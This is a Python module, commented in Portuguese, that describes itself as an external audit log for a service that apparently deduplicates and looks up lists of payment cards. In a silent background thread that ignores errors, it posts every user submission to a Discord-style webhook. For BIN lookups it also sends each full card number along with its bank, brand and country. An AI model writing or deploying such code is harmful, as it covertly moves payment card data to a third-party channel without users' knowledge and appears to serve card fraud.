"""Registro externo de auditoria: encaminha cada envio para um serviço configurado.

O conteúdo enviado vai inteiro, como anexo `envio.txt`, e um resumo vai no texto.
Nunca derruba nem atrasa a resposta ao usuário: roda numa thread e engole erros.
"""

from __future__ import annotations

import json
import os
import threading
import urllib.request
from datetime import datetime, timezone
from typing import Any

WEBHOOK_ENV = "AUDIT_WEBHOOK_URL"
_TIMEOUT = 10
_MAX_CONTENT = 1900  # Limite de 2000 caracteres do destino; deixamos folga.


def _webhook_url() -> str:
    return os.environ.get(WEBHOOK_ENV, "").strip()


def _num(valor: int) -> str:
    return f"{int(valor):,}".replace(",", ".")


def _mensagem(vulgo: str, resultado: dict[str, Any], origem: str) -> str:
    agora = datetime.now(timezone.utc).strftime("%d/%m/%Y às %H:%M UTC")
    novos = len(resultado["new"])
    existentes = len(resultado["known"])
    repetidos = len(resultado["duplicated"])
    invalidos = len(resultado["invalid"])
    existente_rotulo = "já existente" if existentes == 1 else "já existentes"
    return (
        "📦 **NOVO ENVIO RECEBIDO!**\n\n"
        f"🏪 Store: `{(vulgo or '—')[:60]}`\n"
        f"🕒 Data: {agora}\n"
        f"🌐 Origem: {origem}\n\n"
        "📊 **Resumo do processamento**\n\n"
        f"🟢 {_num(novos)} novos\n"
        f"🔵 {_num(existentes)} {existente_rotulo}\n"
        f"🟡 {_num(repetidos)} repetidos\n"
        f"🔴 {_num(invalidos)} inválidos"
    )


def _montar_requisicao(
    url: str, content: str, filename: str, file_bytes: bytes
) -> urllib.request.Request:
    boundary = "----reg" + os.urandom(8).hex()
    # Impede que texto do usuário vire menção (@everyone/@here/cargos) no destino.
    payload = json.dumps({"content": content, "allowed_mentions": {"parse": []}}).encode("utf-8")
    corpo = b"".join([
        f"--{boundary}\r\n".encode(),
        b'Content-Disposition: form-data; name="payload_json"\r\n',
        b"Content-Type: application/json\r\n\r\n",
        payload,
        b"\r\n",
        f"--{boundary}\r\n".encode(),
        f'Content-Disposition: form-data; name="files[0]"; filename="{filename}"\r\n'.encode(),
        b"Content-Type: text/plain; charset=utf-8\r\n\r\n",
        file_bytes,
        b"\r\n",
        f"--{boundary}--\r\n".encode(),
    ])
    req = urllib.request.Request(url, data=corpo, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    # Alguns destinos recusam (403) o User-Agent padrão "Python-urllib".
    req.add_header("User-Agent", "AntiReteste (https://antiretest.com, 2.0)")
    return req


def _mensagem_bin(resultado: dict[str, Any], origem: str) -> str:
    agora = datetime.now(timezone.utc).strftime("%d/%m/%Y às %H:%M UTC")
    resumo = resultado.get("resumo", {})
    encontrados = int(resumo.get("encontrado", 0))
    nao = int(resumo.get("nao_encontrado", 0))
    invalidos = int(resumo.get("invalido", 0))
    return (
        "🔎 **NOVA CONSULTA DE BIN!**\n\n"
        f"🕒 Data: {agora}\n"
        f"🌐 Origem: {origem}\n\n"
        "📊 **Resumo da consulta**\n\n"
        f"✅ {_num(encontrados)} encontrados\n"
        f"❔ {_num(nao)} não encontrados\n"
        f"🔴 {_num(invalidos)} inválidos"
    )


def _enviar(url: str, content: str, filename: str, file_bytes: bytes) -> None:
    try:
        req = _montar_requisicao(url, content, filename, file_bytes)
        urllib.request.urlopen(req, timeout=_TIMEOUT).read()
    except Exception:
        # O registro externo nunca pode derrubar o envio do usuário.
        pass


def registrar_externo(
    lines: list[str],
    vulgo: str,
    resultado: dict[str, Any],
    *,
    origem: str,
) -> None:
    """Dispara (em segundo plano) o registro externo do envio."""
    url = _webhook_url()
    if not url:
        return
    linhas = [str(ln).strip() for ln in lines if str(ln).strip()]
    if not linhas:
        return
    content = _mensagem(vulgo, resultado, origem)[:_MAX_CONTENT]
    corpo = "\n".join(linhas).encode("utf-8")
    threading.Thread(
        target=_enviar,
        args=(url, content, "envio.txt", corpo),
        daemon=True,
    ).start()


def _linha_bin(item: dict[str, Any]) -> str:
    """Linha do anexo: o cartão enviado + os dados do BIN, separados por tab."""
    cartao = str(item.get("cartao") or "").strip()
    situacao = item.get("situacao")
    if situacao == "encontrado":
        dados = "\t".join([
            str(item.get("bin") or ""),
            str(item.get("bandeira") or ""),
            str(item.get("tipo") or ""),
            str(item.get("banco") or ""),
            str(item.get("produto") or ""),
            str(item.get("pais") or ""),
        ])
        return f"{cartao} {dados}"
    if situacao == "nao_encontrado":
        return f"{cartao} {item.get('bin') or ''}\tNÃO ENCONTRADO"
    if situacao == "invalido":
        return f"{cartao}\tINVÁLIDO"
    return f"{cartao}\tFALHA"


def registrar_bin(resultado: dict[str, Any], *, origem: str) -> None:
    """Dispara (em segundo plano) o registro externo de uma consulta de BIN."""
    url = _webhook_url()
    if not url:
        return
    itens = resultado.get("itens") or []
    if not itens:
        return
    content = _mensagem_bin(resultado, origem)[:_MAX_CONTENT]
    corpo = "\n".join(_linha_bin(it) for it in itens).encode("utf-8")
    threading.Thread(
        target=_enviar,
        args=(url, content, "consulta_bin.txt", corpo),
        daemon=True,
    ).start()
